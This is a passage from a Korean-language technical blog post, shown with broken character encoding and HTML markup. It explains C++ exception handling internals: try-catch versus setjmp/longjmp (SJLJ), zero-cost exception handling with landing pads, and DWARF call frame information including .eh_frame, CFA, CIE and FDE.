class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;constructor called.\n&quot;</span>); &#125;</span><br><span class="line">    ~<span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;destructor called.\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n: %d\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123; <span class="keyword">throw</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;calling func2.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">func2</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;calling func.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">func</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (<span class="type">const</span> <span class="type">int</span>&amp; e) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;catch block in main.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ g++ eh1.cc -o eh1 -no-pie</span><br><span class="line">$ ./eh1</span><br><span class="line">calling func.</span><br><span class="line">constructor called.</span><br><span class="line">calling func2.</span><br><span class="line">n: 0</span><br><span class="line">destructor called.</span><br><span class="line">catch block in main.</span><br></pre></td></tr></table></figure><h3 id="sjlj" tabindex="-1">SJLJ</h3><p>try-catch êµ¬ë¬¸ì„ ì´ìš©í•œ ì˜ˆì™¸ì²˜ë¦¬ë¥¼ êµ¬í˜„í•˜ê¸° ìœ„í•´ì„œëŠ” í•¨ìˆ˜ì˜ ë²”ìœ„ë¥¼ ë›°ì–´ë„˜ëŠ”(non-local) ë¶„ê¸°ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆì™¸ê°€ ë°œìƒí•˜ëŠ” ë¶€ë¶„ê³¼ ì˜ˆì™¸ì— ëŒ€ì‘í•˜ëŠ” catch ë¸”ë¡ì´ í•­ìƒ ê°™ì€ í•¨ìˆ˜ ë‚´ì— ìˆë‹¤ëŠ” ë³´ì¥ì´ ì—†ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ˆê¸°ì˜ ì»´íŒŒì¼ëŸ¬ë“¤ì€ try-catch êµ¬ë¬¸ì„ <code>setjmp</code> , <code>longjmp</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ êµ¬í˜„í•˜ì˜€ìŠµë‹ˆë‹¤. ì´ ë°©ì‹ì„ SJLJ ë°©ì‹ì´ë¼ í•©ë‹ˆë‹¤.</p><p><code>setjmp</code> í•¨ìˆ˜ëŠ” ë¶„ê¸°ë¥¼ í†µí•´ ì‹¤í–‰ íë¦„ì´ ëŒì•„ì˜¬ ê³³ì„ ì§€ì •í•©ë‹ˆë‹¤. <code>jmp_buf</code> íƒ€ì…ì„ ì¸ìë¡œ ë°›ê³ , ìµœì´ˆ ì‹¤í–‰ ì‹œ <code>jmp_buf</code> ì— ì‹¤í–‰ í™˜ê²½(e.g. ìŠ¤íƒ í¬ì¸í„°, ì¸ìŠ¤íŠ¸ëŸ­ì…˜ í¬ì¸í„° ë“±)ì„ ì €ì¥í•œ í›„ 0ì„ ë°˜í™˜í•©ë‹ˆë‹¤. <code>longjmp</code> í•¨ìˆ˜ëŠ” <code>jmp_buf</code> íƒ€ì…ê³¼ ì •ìˆ˜í˜• ê°’ <code>val</code> ì„ ì¸ìë¡œ ë°›ê³ , ì‹¤í–‰ í™˜ê²½ì„ ì €ì¥í–ˆë˜ ìœ„ì¹˜ë¡œ íë¦„ì„ ëŒë ¤ <code>setjmp</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. í˜¸ì¶œëœ <code>setjmp</code> í•¨ìˆ˜ëŠ” <code>val</code> ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ì „ ë¬¸ë‹¨ì˜ ì˜ˆì™¸ ì²˜ë¦¬ ì˜ˆì œë¥¼ <code>setjmp</code> , <code>longjmp</code> í•¨ìˆ˜ë¡œ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;constructor called.\n&quot;</span>); &#125;</span><br><span class="line">    ~<span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;destructor called.\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jmp_buf env;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n: %d\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123; <span class="built_in">longjmp</span>(env, <span class="number">1</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;calling func2.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">func2</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">setjmp</span>(env) == <span class="number">0</span>) &#123;                 <span class="comment">// try</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;calling func.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">func</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                <span class="comment">// catch</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;catch block in main.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./eh2</span><br><span class="line">calling func.</span><br><span class="line">constructor called.</span><br><span class="line">calling func2.</span><br><span class="line">n: 0</span><br><span class="line">catch block in main.</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ°ë° ì»´íŒŒì¼í•˜ê³  ì‹¤í–‰í•˜ë©´ try-catch êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ì˜€ì„ ë•Œì™€ëŠ” ë‹¤ë¥´ê²Œ <code>MyClass</code> ì˜ ì†Œë©¸ìê°€ ìë™ìœ¼ë¡œ í˜¸ì¶œë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. <code>setjmp</code> ì™€ <code>longjmp</code> í•¨ìˆ˜ëŠ” ë‹¨ìˆœíˆ ë¶„ê¸°ë§Œì„ ìˆ˜í–‰í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ SJLJ ë°©ì‹ì˜ ì˜ˆì™¸ ì²˜ë¦¬ì—ì„œ ë„ì¤‘ì— ìƒì„±ëœ ê°ì²´ë¥¼ ì†Œë©¸ì‹œí‚¤ê¸° ìœ„í•´ì„œëŠ” ê·¸ë¦¼ê³¼ ê°™ì´ ìŠ¤íƒì„ í•˜ë‚˜ ë‘ê³ , ê°ì²´ë¥¼ ìƒì„±í•  ë•Œë§ˆë‹¤ ê°ì²´ì™€ ì†Œë©¸ìë¥¼ í‘¸ì‹œí•˜ì—¬ì•¼ í•©ë‹ˆë‹¤. ì´í›„ ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¬ ë•Œ ìŠ¤íƒì„ ìˆœíšŒí•˜ë©° ì†Œë©¸ìë¥¼ í˜¸ì¶œí•œ í›„ <code>longjmp</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/2.png" alt="2.png"></p><h3 id="zero-cost-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC" tabindex="-1">Zero-cost ì˜ˆì™¸ ì²˜ë¦¬</h3><p>SJLJ ë°©ì‹ì˜ ì˜ˆì™¸ ì²˜ë¦¬ëŠ” êµ¬í˜„ì´ ë‹¨ìˆœí•˜ì§€ë§Œ ì˜ˆì™¸ê°€ ë°œìƒí•˜ì§€ ì•ŠëŠ” ìƒí™©ì—ì„œë„ ì˜¤ë²„í—¤ë“œë¥¼ ê°•ì œí•œë‹¤ëŠ” ë‹¨ì ì´ ìˆìŠµë‹ˆë‹¤. try ë¸”ë¡ í•˜ë‚˜ ë‹¹ ìŠ¤íƒê³¼ <code>jmp_buf</code> ê°€ í•˜ë‚˜ì”© í•„ìš”í•˜ë©°, ì˜ˆì™¸ ë°œìƒ ì—¬ë¶€ì™€ ê´€ê³„ì—†ì´ ê°ì²´ë¥¼ ìƒì„±í•  ë•Œë§ˆë‹¤ í‘¸ì‹œì™€ íŒì„ ë°˜ë³µí•´ì•¼ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ ê²½ìš° ë³µì¡í•œ í”„ë¡œê·¸ë¨ì—ì„œëŠ” ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ ì ì§€ ì•Šì€ ì„±ëŠ¥ ì €í•˜ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì¸í…”(Intel) ì‚¬ëŠ” 2001ë…„ ì•„ì´í…Œë‹ˆì—„(Itanium, IA-64) ì•„í‚¤í…ì²˜ë¥¼ ì„¤ê³„í•˜ë©´ì„œ ì˜ˆì™¸ê°€ ì—†ìœ¼ë©´ ì˜¤ë²„í—¤ë“œë„ ì—†ëŠ” ì˜ˆì™¸ ì²˜ë¦¬ ë°©ì‹ì„ ì œì•ˆí•˜ì˜€ìŠµë‹ˆë‹¤. ì´ ë°©ì‹ì„ zero-cost ì˜ˆì™¸ ì²˜ë¦¬(zero-cost exception handling)ì´ë¼ê³  í•©ë‹ˆë‹¤. ìƒˆë¡œìš´ ë°©ì‹ì€ ì»´íŒŒì¼ëŸ¬ ê°œë°œìë“¤ì— ì˜í•´ ì±„íƒë˜ì–´ ë‹¤ë¥¸ ì•„í‚¤í…ì²˜ë¡œë„ í¬íŒ…ë˜ì—ˆê³ , ì§€ê¸ˆì€ ì¼ë°˜ì ìœ¼ë¡œ ì»´íŒŒì¼ì„ ìˆ˜í–‰í•˜ë©´ ê¸°ë³¸ê°’ìœ¼ë¡œ ì ìš©í•˜ëŠ” í‘œì¤€ ë°©ì‹ì´ ë˜ì—ˆìŠµë‹ˆë‹¤. Zero-cost ì˜ˆì™¸ ì²˜ë¦¬ì˜ êµ¬í˜„ì„ ì‚´í´ë³´ê¸° ìœ„í•´ì„œëŠ” ë¨¼ì € ëœë”© íŒ¨ë“œì˜ ê°œë…ì„ ì´í•´í•´ì•¼ í•©ë‹ˆë‹¤.</p><p>ëœë”© íŒ¨ë“œ(landing pad)ëŠ” í”„ë¡œê·¸ë¨ ì½”ë“œì˜ ì¼ë¶€ë¡œ, ì˜ˆì™¸ê°€ ë°œìƒí–ˆì„ ë•Œ ëŒ€ì‘í•˜ê±°ë‚˜ ê°ì²´ì˜ ìì› í• ë‹¹ì„ í•´ì œí•˜ëŠ” ë“±ì˜ cleanup ì‘ì—…ì„ ìœ„í•œ ë¶€ë¶„ì…ë‹ˆë‹¤. ì•ì„œ ì»´íŒŒì¼í•œ <code>eh1</code> ë°”ì´ë„ˆë¦¬ì—ëŠ” ë‘ ê°œì˜ ëœë”© íŒ¨ë“œê°€ ì¡´ì¬í•©ë‹ˆë‹¤. <code>func</code> í•¨ìˆ˜ì˜ <code>MyClass</code> ê°ì²´ë¥¼ ì†Œë©¸ì‹œí‚¤ëŠ” ì½”ë“œì™€ <code>main</code> í•¨ìˆ˜ì˜ catch ë¸”ë¡ì…ë‹ˆë‹¤. <code>func</code> í•¨ìˆ˜ì˜ ê·¸ë˜í”„ë¥¼ ë³´ë©´ ë³´ë¼ìƒ‰ ë¸”ë¡ê³¼ ê°™ì´ ì‹¤í–‰ íë¦„ê³¼ ë™ë–¨ì–´ì§„ ì½”ë“œê°€ ìˆìŠµë‹ˆë‹¤. ì´ ì½”ë“œê°€ ë°”ë¡œ <code>MyClass</code> ê°ì²´ì˜ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ëŠ” ëœë”© íŒ¨ë“œì…ë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/3.png" alt="3.png"></p><p><code>main</code> í•¨ìˆ˜ì˜ ê·¸ë˜í”„ì—ì„œë„ ë³´ë¼ìƒ‰ ë¸”ë¡ìœ¼ë¡œ ë‚˜íƒ€ë‚¸, ë¬¸ìì—´ì„ ì¶œë ¥í•˜ê³  0ì„ ë°˜í™˜í•˜ëŠ” ë¸”ë¡ìœ¼ë¡œ ì´ì–´ì§€ëŠ” ì½”ë“œê°€ ìˆìŠµë‹ˆë‹¤. ì´ ì½”ë“œ ë˜í•œ ëœë”© íŒ¨ë“œì´ë©°, ì†ŒìŠ¤ ì½”ë“œ ìƒì—ì„œ catch ë¸”ë¡ì— í•´ë‹¹í•©ë‹ˆë‹¤. ì˜ˆì™¸ê°€ ë°œìƒí•˜ë©´ ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ìˆ˜í–‰í•˜ë©´ì„œ <code>func</code> í•¨ìˆ˜ì˜ ëœë”© íŒ¨ë“œì™€ <code>main</code> í•¨ìˆ˜ì˜ ëœë”© íŒ¨ë“œë¥¼ ìˆœì„œëŒ€ë¡œ ë°©ë¬¸í•˜ê²Œ ë©ë‹ˆë‹¤. ì „ìëŠ” ì†Œë©¸ì í˜¸ì¶œ í›„ <code>_Unwind_Resume</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ê³„ì†í•˜ì§€ë§Œ, í›„ìëŠ” ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ë§ˆì¹˜ê³  ì‹¤í–‰ íë¦„ìœ¼ë¡œ ëŒì•„ì˜¨ë‹¤ëŠ” ì°¨ì´ê°€ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/4.png" alt="4.png"></p><p>ì•ì„œ try-catch êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ë©´ í˜¸ì¶œ ìŠ¤íƒì˜ ì¤‘ê°„ì—ì„œ ìƒì„±ëœ ê°ì²´ëŠ” ìë™ìœ¼ë¡œ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•œë‹¤ê³  í•˜ì˜€ìŠµë‹ˆë‹¤. ì´ëŠ” ì‚¬ì‹¤ ì»´íŒŒì¼ëŸ¬ê°€ ì†Œë©¸ì í˜¸ì¶œì´ í•„ìš”í•œ í•¨ìˆ˜ì— ë¯¸ë¦¬ ëœë”© íŒ¨ë“œë¥¼ ì¤€ë¹„í•˜ê³ , ìŠ¤íƒ ë˜ê°ê¸° ê³¼ì •ì—ì„œ ëœë”© íŒ¨ë“œë¥¼ ìˆœì„œëŒ€ë¡œ ë°©ë¬¸í•˜ë„ë¡ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê·¸ëŸ°ë° ì–´ë–»ê²Œ í”„ë¡œê·¸ë¨ì´ <code>setjmp</code> , <code>longjmp</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ë„ ì‹¤í–‰ íë¦„ì„ ë˜ëŒë¦¬ê³ , ëœë”© íŒ¨ë“œë¥¼ ì°¾ì•„ì„œ ë°©ë¬¸í•  ìˆ˜ ìˆì„ê¹Œìš”? Zero-cost ì˜ˆì™¸ ì²˜ë¦¬ ë°©ì‹ì˜ ë‚´ë¶€ ì›ë¦¬ì— ëŒ€í•´ ë” ê¹Šì´ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><h2 id="dwarf-cfi" tabindex="-1">DWARF CFI</h2><p>í”„ë¡œê·¸ë¨ì´ <code>setjmp</code> , <code>longjmp</code> í•¨ìˆ˜ ì—†ì´ë„ ì‹¤í–‰ íë¦„ì„ ëŒë¦´ ìˆ˜ ìˆëŠ” ì´ìœ ëŠ” ë°”ì´ë„ˆë¦¬ì˜ ë””ë²„ê·¸ ë°ì´í„°ì— ìŠ¤íƒ ë˜ê°ê¸°ì— í•„ìš”í•œ ì •ë³´ê°€ ì¸ì½”ë”©ë˜ì–´ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. DWARFëŠ” ELF ì‹¤í–‰ íŒŒì¼ì„ ìœ„í•œ ë””ë²„ê·¸ ë°ì´í„° í˜•ì‹ìœ¼ë¡œ ì†ŒìŠ¤ ì½”ë“œ ìˆ˜ì¤€ì˜ ë””ë²„ê¹…ì„ ìœ„í•œ ë‹¤ì–‘í•œ ì •ë³´ë¥¼ ì œê³µí•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ ì¤‘ í˜¸ì¶œ í”„ë ˆì„ ì •ë³´(call frame information)ê°€ ê¸°ë¡ëœ <code>.eh_frame</code> ì„¹ì…˜ì´ ë°”ë¡œ ìŠ¤íƒ ë˜ê°ê¸°ì— í•„ìš”í•œ ë¶€ë¶„ì…ë‹ˆë‹¤.</p><p>ì¼ë°˜ì ìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì— í‘¸ì‹œí•©ë‹ˆë‹¤. ì´í›„ í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì—ì„œ ì´ì „ í•¨ìˆ˜ì˜ í”„ë ˆì„ í¬ì¸í„°ë¥¼ í‘¸ì‹œí•˜ê³ , ê°’ì„ ë³´ì¡´í•´ì•¼ í•  ë ˆì§€ìŠ¤í„°ë“¤ì´ ìˆë‹¤ë©´ ì¶”ê°€ë¡œ í‘¸ì‹œí•©ë‹ˆë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ì— ê·¸ë¦¼ê³¼ ê°™ì´ ìŠ¤íƒì—ì„œ íŠ¹ì • ì£¼ì†Œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì¡°ì‚¬í•˜ë©´ ì´ì „ í•¨ìˆ˜ì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ í¬ì¸í„°, í”„ë ˆì„ í¬ì¸í„°, ë ˆì§€ìŠ¤í„° ê°’ë“¤ì„ ëª¨ë‘ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ê¸°ì¤€ì´ ë˜ëŠ” ì£¼ì†Œë¥¼ CFA(cannonical frame address)ë¼ê³  í•˜ë©°, ë³´í†µ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ì§ì „ì˜ ìŠ¤íƒ í¬ì¸í„°ë¥¼ CFAë¡œ ì •ì˜í•©ë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/5.png" alt="5.png"></p><p>ì´ì „ í•¨ìˆ˜ì˜ í”„ë ˆì„ì—ì„œ ì‚¬ìš©í•˜ëŠ” ê°’ì„ ëª¨ë‘ ë³µì›í•  ìˆ˜ ìˆë‹¤ë©´ ìŠ¤íƒì„ ë˜ê°ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>.eh_frame</code> ì„¹ì…˜ì€ ì´ë¥¼ ìœ„í•´ ê°œë…ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í˜¸ì¶œ í”„ë ˆì„ í…Œì´ë¸”ì„ ì¤€ë¹„í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOC CFA R0  R1  ... RN</span><br><span class="line">L0</span><br><span class="line">L1</span><br><span class="line">...</span><br><span class="line">LN</span><br></pre></td></tr></table></figure><p>í…Œì´ë¸”ì—ì„œ LOC ì—´ì€ ì½”ë“œ ì˜ì—­ì˜ ëª¨ë“  ì£¼ì†Œë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. CFA ì—´ì€ í•´ë‹¹ ì£¼ì†Œì˜ ì½”ë“œ ë¬¸ë§¥ì—ì„œ CFAë¥¼ ì–´ë–»ê²Œ ê³„ì‚°í•˜ëŠ”ì§€ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. (e.g. <code>RSP + 8</code>) R1, â€¦ , RN ì—´ì€ ì•„í‚¤í…ì²˜ì˜ ë²”ìš© ë ˆì§€ìŠ¤í„°ë“¤ì— ëŒ€ì‘í•˜ë©°, ì´ì „ í”„ë ˆì„ì—ì„œ ì‚¬ìš© ì¤‘ì´ë˜ í•´ë‹¹ ë ˆì§€ìŠ¤í„°ì˜ ê°’ì´ CFAë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì–´ë””ì— ëŒ€ì‘í•˜ëŠ”ì§€ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. (e.g. <code>*(CFA - 24)</code>) ì¦‰, ì´ í…Œì´ë¸”ì€ ì½”ë“œ ìƒì˜ ëª¨ë“  ì£¼ì†Œì—ì„œ ì´ì „ í•¨ìˆ˜ë¡œ ìŠ¤íƒì„ ë˜ê°ì„ ìˆ˜ ìˆë„ë¡ í•„ìš”í•œ ì •ë³´ë¥¼ ì œê³µí•˜ê³  ìˆëŠ” ê²ƒì…ë‹ˆë‹¤.</p><p>ê·¸ëŸ°ë° ì‹¤ì œë¡œ ëª¨ë“  ì£¼ì†Œì— ëŒ€í•œ í˜¸ì¶œ í”„ë ˆì„ í…Œì´ë¸”ì„ ì¸ì½”ë”©í•œë‹¤ë©´ ë°”ì´ë„ˆë¦¬ì—ì„œ í”„ë¡œê·¸ë¨ ì½”ë“œë³´ë‹¤ í…Œì´ë¸”ì´ ì°¨ì§€í•˜ëŠ” ë¹„ì¤‘ì´ ë„ˆë¬´ ë§ì•„ ìš©ëŸ‰ì´ ìƒë‹¹íˆ ì»¤ì§ˆ ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ <code>.eh_frame</code> ì„¹ì…˜ì€ ì‚¬ì‹¤ í…Œì´ë¸”ì´ ì•„ë‹ˆë¼ í…Œì´ë¸”ì˜ íŠ¹ì • í–‰ì„ ì–´ë–»ê²Œ êµ¬ì„±í•´ì•¼ í•˜ëŠ”ì§€ ì§€ì‹œí•˜ëŠ” ë°”ì´íŠ¸ì½”ë“œë¡œ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ ë°”ì´íŠ¸ì½”ë“œëŠ” í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜(call frame instruction)ì´ë¼ëŠ” ë³„ë„ì˜ í˜•ì‹ì„ ê°–ê³  ìˆìœ¼ë©°, CIE(common information entry)ì™€ FDE(frame description entry)ë¼ëŠ” êµ¬ì¡°ì²´ì— ë‚˜ëˆ„ì–´ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ëŸ°íƒ€ì„ì—ì„œëŠ” ì˜ˆì™¸ê°€ ë°œìƒí•œ ì£¼ì†Œì— í•´ë‹¹í•˜ëŠ” CIEì™€ FDEë¥¼ ì°¾ì€ í›„ ë°”ì´íŠ¸ì½”ë“œê°€ ì§€ì‹œí•˜ëŠ” ëŒ€ë¡œ ì´ì „ í”„ë ˆì„ì—ì„œ ì‚¬ìš©í•˜ëŠ” ê°’ë“¤ì„ ë³µì›í•˜ë©´ì„œ í˜¸ì¶œ ìŠ¤íƒì„ í•œ ë‹¨ê³„ì”© ë˜ê°ìŠµë‹ˆë‹¤.</p><h3 id="cie%EC%99%80-fde" tabindex="-1">CIEì™€ FDE</h3><p>CIEì™€ FDEëŠ” ì´ì „ í”„ë ˆì„ì˜ ê°’ë“¤ì„ ë³µì›í•˜ê¸° ìœ„í•œ í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì„ ë¹„ë¡¯í•˜ì—¬ ì—¬ëŸ¬ ê°€ì§€ ì •ë³´ê°€ ì €ì¥ëœ êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. CIEëŠ” ì—¬ëŸ¬ ê°œì˜ FDEì—ì„œ ê³µí†µì ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ì •ë³´ì„ í¬í•¨í•˜ê³  ìˆìœ¼ë©°, CIEì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ FDEì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•˜ê¸° ì „ ë¨¼ì € ì‹¤í–‰ë©ë‹ˆë‹¤. FDEëŠ” íŠ¹ì • í•¨ìˆ˜ì™€ ê°™ì´ ì œí•œì ì¸ ì£¼ì†Œ ë²”ìœ„ì—ì„œë§Œ ìœ íš¨í•œ ì •ë³´ë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. CIEì˜ ë‚´ìš© ì¤‘ ì¤‘ìš”í•œ í•„ë“œë“¤ì„ ë‚˜ì—´í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>CIE_id</code><ul><li>CIEì˜ ì‹ë³„ìì…ë‹ˆë‹¤.</li></ul></li><li><code>augmentation</code><ul><li>ìŠ¤íƒ ë˜ê°ê¸°ì— ìˆì–´ íŠ¹ì • í”„ë¡œê·¸ë˜ë° ì–¸ì–´ì—ì„œ ìš”êµ¬í•˜ëŠ” ë‚´ìš©ì´ ìˆëŠ”ì§€ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì˜ˆì™¸ ì²˜ë¦¬ì™€ ê´€ë ¨ëœ ë‚´ìš©ìœ¼ë¡œëŠ” personality ë£¨í‹´ì˜ ì¡´ì¬ ì—¬ë¶€ì™€ LSDAì˜ ìœ„ì¹˜ë¥¼ í¬í•¨í•˜ê³  ìˆëŠ”ë°, í›„ìˆ í•©ë‹ˆë‹¤.</li></ul></li><li><code>return_address_register</code><ul><li>í…Œì´ë¸”ì˜ R1, â€¦ , RN ì¤‘ ì–´ë–¤ ë ˆì§€ìŠ¤í„°ì˜ ê°’ì´ í•´ë‹¹ í”„ë ˆì„ì—ì„œ ë¦¬í„´ ì£¼ì†Œì— í•´ë‹¹í•˜ëŠ”ì§€ 